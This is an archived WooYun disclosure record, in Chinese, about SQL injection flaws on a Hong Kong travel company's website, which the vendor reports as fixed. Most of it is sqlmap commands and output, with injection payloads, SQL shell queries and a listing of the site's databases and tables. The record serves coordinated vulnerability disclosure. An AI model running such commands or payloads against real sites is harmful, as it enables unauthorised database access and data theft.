{"id": 75951, "wybug_id": "wooyun-2015-0166002", "wybug_title": "環島旅運有限公司官網多處SQL註入（香港地區）", "wybug_corp": "環島旅運有限公司", "wybug_author": "路人甲", "wybug_date": "2015-12-30 18:10", "wybug_open_date": "2016-02-01 19:45", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "\t\t\t\t\t\t\t\t已交由第三方合作机构(hkcert香港互联网应急协调中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-02-01：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： ：） 详细说明：  1、python sqlmap.py -u \"http://**.**.**.**/en/service21_details.php?id=39\"\nGET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection point(s) with a total of 183 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=39 AND 8150=8150    Type: UNION query    Title: MySQL UNION query (58) - 14 columns    Payload: id=-5616 UNION ALL SELECT 58,58,58,CONCAT(0x7176716a71,0x43665544657848495770585a49626245726e736b4973776e7344676f456f6d5355686a5062666d70,0x716b707a71),58,58,58,58,58,58,58,58,58,58#---web server operating system: Windowsweb application technology: PHP 5.4.12, Apache 2.2.22back-end DBMS: MySQL >= 5.0.0current user:    'trans@%'current database:    'testtransisland_en'\n2、python sqlmap.py -u \"http://**.**.**.**/en/service12.php?nid=11\"\nGET parameter 'nid' is vulnerable. Do you want to keep testing the others (if any)? [y/N] ysqlmap identified the following injection point(s) with a total of 227 HTTP(s) requests:---Parameter: nid (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: nid=11' AND 2556=2556 AND 'iEDQ'='iEDQ---web server operating system: Windowsweb application technology: PHP 5.4.12, Apache 2.2.22back-end DBMS: MySQL 5[11:43:10] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTERsql-shell> select @@version;[11:43:20] [INFO] fetching SQL SELECT statement query output: 'select @@version'[11:43:20] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[11:43:20] [INFO] retrieved: 5.0.18-ntselect @@version;:    '5.0.18-nt'sql-shell>\n3、python sqlmap.py -u \"http://**.**.**.**/en/service11.php?nid=3\"\nGET parameter 'nid' is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection point(s) with a total of 227 HTTP(s) requests:---Parameter: nid (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: nid=3' AND 7197=7197 AND 'UWps'='UWps---web server operating system: Windowsweb application technology: PHP 5.4.12, Apache 2.2.22back-end DBMS: MySQL >= 5.0.0[11:48:48] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTERsql-shell> select user();[11:48:59] [INFO] fetching SQL SELECT statement query output: 'select user()'[11:48:59] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[11:48:59] [INFO] retrieved: trans@localhostselect user();:    'trans@localhost'sql-shell>\n4、python sqlmap.py -u \"http://**.**.**.**/en/servicelist.php?nid=2\"\nGET parameter 'nid' is vulnerable. Do you want to keep testing the others (if any)? [y/N]sqlmap identified the following injection points with a total of 114 HTTP(s) requests:---Parameter: nid (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: nid=2' AND 3216=3216 AND 'WbEu'='WbEu    Type: UNION query    Title: MySQL UNION query (97) - 15 columns    Payload: nid=2' UNION ALL SELECT CONCAT(0x717a6b7071,0x504566474b53654c7267,0x717a6b6271),97,97,97,97,97,97,97,97,97,97,97,97,97,97#---web server operating system: Windowsweb application technology: PHP 5.4.12, Apache 2.2.22back-end DBMS: MySQL 5[11:52:53] [INFO] fetching database namesavailable databases [5]:[*] information_schema[*] testtransisland[*] testtransisland_cn[*] testtransisland_en[*] transisland\n数据量挺大的\nDatabase: testtransisland_en+------------------------------------+---------+| Table                              | Entries |+------------------------------------+---------+| visitor_counter                    | 141597  || visitor_counter_servicelist        | 45950   || visitor_counter_servicedetails_13  | 25044   || visitor_counter_servicedetails_26  | 23937   || visitor_counter_servicedetails_101 | 11225   || visitor_counter_service21          | 10813   || visitor_counter_servicedetails_91  | 6156    || visitor_counter_pm                 | 5986    || visitor_counter_news               | 4366    || visitor_counter_servicedetails_100 | 3486    || visitor_counter_hk_visit_spot      | 2879    || visitor_counter_servicedetails_97  | 2817    || visitor_counter_sz_visit_spot      | 2025    || visitor_counter_servicedetails_99  | 1661    || visitor_counter_servicedetails_93  | 1531    || visitor_counter_servicedetails_90  | 1422    || route                              | 68      || promotion                          | 19      || routenode                          | 15      || car                                | 9       || banner                             | 8       || carprice                           | 6       || carnode                            | 5       || contactus                          | 5       || news                               | 5       || park                               | 4       || password                           | 4       || bannernode                         | 3       || bannernode_seq                     | 1       || carnode_seq                        | 1       || faq                                | 1       || faqnode                            | 1       || faqnode_seq                        | 1       || link                               | 1       || linknode                           | 1       || linknode_seq                       | 1       || newsnode                           | 1       || newsnode_seq                       | 1       || otherairportbook                   | 1       || otherairportbooknode               | 1       || otherairportbooknode_seq           | 1       || parknode                           | 1       || parknode_seq                       | 1       || promotionnode                      | 1       || promotionnode_seq                  | 1       || routenode_seq                      | 1       || visitor_counter_servicedetails_1   | 1       |+------------------------------------+---------+\n   漏洞证明：  如上   修复方案：  所有入庫參數增加校驗   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-12-31 15:11 厂商回复： 已將事件通知有關機構 最新状态： 2016-02-01：相關機構回報已修復漏洞  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}